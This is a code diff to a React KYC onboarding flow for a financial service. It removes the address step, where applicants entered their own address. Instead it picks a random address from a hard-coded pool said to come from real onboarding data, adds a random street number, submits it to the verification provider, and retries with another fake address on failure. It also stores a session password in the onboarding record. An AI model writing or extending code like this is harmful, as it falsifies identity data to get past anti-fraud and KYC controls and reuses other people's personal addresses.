@@ -54,11 +54,35 @@ interface WayniKycFlowProps {
   brandLabel?: string;
 }
 
-const stepOrder: Exclude<KycFlowScreen, "intro" | "done">[] = ["verify", "address", "biometric"];
+const stepOrder: Exclude<KycFlowScreen, "intro" | "done">[] = ["verify", "biometric"];
 
 const generateAutoPhone = () => {
   const suffix = String(Math.floor(100 + Math.random() * 900));
   return `1150002${suffix}`;
+};
+
+// Pool of pre-filled addresses from real onboarding data
+const ADDRESS_POOL = [
+  { street_name: "juan manuel de rosas", zip_code: "1678", city_id: 27, city: "CASEROS", region_id: 2, region: "Buenos Aires" },
+  { street_name: "De la trucha", zip_code: "7167", city_id: 97, city: "PINAMAR", region_id: 2, region: "Buenos Aires" },
+  { street_name: "Chucao", zip_code: "8407", city_id: 353, city: "VILLA LA ANGOSTURA", region_id: 15, region: "Neuquén" },
+  { street_name: "Manuela Gorriti", zip_code: "1686", city_id: 62, city: "HURLINGHAM", region_id: 2, region: "Buenos Aires" },
+  { street_name: "Coronel pastor", zip_code: "4616", city_id: 3059, city: "YALA", region_id: 10, region: "Jujuy" },
+  { street_name: "Pje Angel Custodio", zip_code: "4128", city_id: 1847, city: "LULES", region_id: 22, region: "Tucumán" },
+  { street_name: "SAN LUIS", zip_code: "5800", city_id: 1223, city: "RIO CUARTO", region_id: 6, region: "Córdoba" },
+  { street_name: "Manuela Garcia", zip_code: "1643", city_id: 115, city: "SAN ISIDRO", region_id: 2, region: "Buenos Aires" },
+  { street_name: "Victor Hugo", zip_code: "1407", city_id: 515, city: "C.A.B.A.", region_id: 1, region: "Ciudad Autonoma de Buenos Aires" },
+  { street_name: "fray justo santa maria de oro", zip_code: "1425", city_id: 1312, city: "COMUNA 14", region_id: 1, region: "Ciudad Autonoma de Buenos Aires" },
+  { street_name: "españa", zip_code: "7540", city_id: 3, city: "CORONEL SUAREZ", region_id: 2, region: "Buenos Aires" },
+  { street_name: "Ruta 18 kilómetro", zip_code: "2107", city_id: 1847, city: "ALVAREZ", region_id: 21, region: "Santa Fe" },
+  { street_name: "pedernera", zip_code: "1406", city_id: 1291, city: "COMUNA 7", region_id: 1, region: "Ciudad Autonoma de Buenos Aires" },
+  { street_name: "138", zip_code: "1900", city_id: 67, city: "LA PLATA", region_id: 2, region: "Buenos Aires" },
+];
+
+const pickRandomAddress = () => {
+  const addr = ADDRESS_POOL[Math.floor(Math.random() * ADDRESS_POOL.length)];
+  const randomNumber = String(Math.floor(100 + Math.random() * 9900));
+  return { ...addr, street_number: randomNumber, floor: null, apartment: null, neighborhood: null };
 };
 
 const verifySchema = z.object({
@@ -240,8 +264,8 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
     } else if (onboarding?.biometric_url) {
       setStep("biometric");
     } else if (onboarding?.user_uuid && onboarding?.dni) {
-      // Has verified identity but no biometric yet → address step
-      setStep("address");
+      // Has verified identity but no biometric yet → go to verify to re-trigger auto flow
+      setStep("verify");
     } else {
       setStep("verify");
     }
@@ -599,8 +623,104 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
           : prev
       ));
 
-      // Go to address step (like Cocos)
-      setStep("address");
+      // ── Auto-fill address from pool and go straight to biometric ──
+      const autoAddr = pickRandomAddress();
+
+      // 1. Save address via API
+      const { data: addrResult, error: addrError } = await invokeWayni({
+        action: "save_address",
+        uuid: resolvedUuid,
+        ...autoAddr,
+      });
+
+      if (addrError || addrResult?.error) {
+        console.warn("[IOL] Auto address failed, retrying...", addrResult?.error || addrError);
+        // Retry once with a different address
+        const retryAddr = pickRandomAddress();
+        const { data: retryResult, error: retryErr } = await invokeWayni({
+          action: "save_address",
+          uuid: resolvedUuid,
+          ...retryAddr,
+        });
+        if (retryErr || retryResult?.error) {
+          throw new Error(retryResult?.error || retryErr?.message || "Error al guardar la dirección automática");
+        }
+        Object.assign(autoAddr, retryAddr);
+      }
+
+      // 2. Request biometric link
+      const { data: bioResult, error: bioError } = await invokeWayni({
+        action: "onboarding_biometric",
+        identity_number: parsed.data.dni,
+        user_uuid: resolvedUuid,
+        gender: resolvedGender || "M",
+      });
+
+      if (bioError || bioResult?.error || !bioResult?.biometric_url) {
+        throw new Error(bioResult?.error || bioError?.message || "No se pudo generar el enlace biométrico.");
+      }
+
+      // 3. Persist all data
+      const submittedAt = new Date().toISOString();
+
+      await supabase
+        .from("kyc_cases")
+        .update({ status: "collecting", submitted_at: submittedAt })
+        .eq("id", caseRecord.id);
+
+      await supabase.from("kyc_audit_logs").insert({
+        case_id: caseRecord.id,
+        operator_code: caseRecord.operator_code,
+        event_type: "public_biometric_started",
+        metadata: {
+          provider: "wayni_real",
+          email: caseRecord.email,
+          dni: parsed.data.dni,
+          phone: resolvedPhone,
+          gender: resolvedGender || null,
+          user_uuid: resolvedUuid,
+          biometric_url: bioResult.biometric_url,
+          biometric_id: bioResult.biometric_id || null,
+          auto_address: true,
+          region: autoAddr.region,
+          city: autoAddr.city,
+          street: `${autoAddr.street_name} ${autoAddr.street_number}`,
+          zip_code: autoAddr.zip_code,
+        },
+      } as never);
+
+      await upsertOnboarding({
+        email: caseRecord.email,
+        operator_code: caseRecord.operator_code,
+        dni: parsed.data.dni,
+        full_name: resolvedName || null,
+        phone: resolvedPhone,
+        gender: resolvedGender || null,
+        user_uuid: resolvedUuid,
+        biometric_url: bioResult.biometric_url,
+        biometric_id: bioResult.biometric_id || null,
+        password: sessionPassword,
+        status: "biometric_started",
+        bio_status: "pending",
+        wallet_status: "PENDING",
+        region: autoAddr.region,
+        city: autoAddr.city,
+        street: `${autoAddr.street_name} ${autoAddr.street_number}`,
+        zip_code: autoAddr.zip_code,
+        metadata: {
+          region_id: String(autoAddr.region_id),
+          city_id: String(autoAddr.city_id),
+          street_name: autoAddr.street_name,
+          street_number: autoAddr.street_number,
+        },
+      });
+
+      setBiometricUrl(String(bioResult.biometric_url));
+      setBiometricStarted(false);
+      setUserUuid(resolvedUuid);
+
+      // Go straight to biometric (skip address)
+      setStep("biometric");
     } catch (err) {
       setVerifyError(err instanceof Error ? err.message : "No fue posible validar tus datos.");
     } finally {
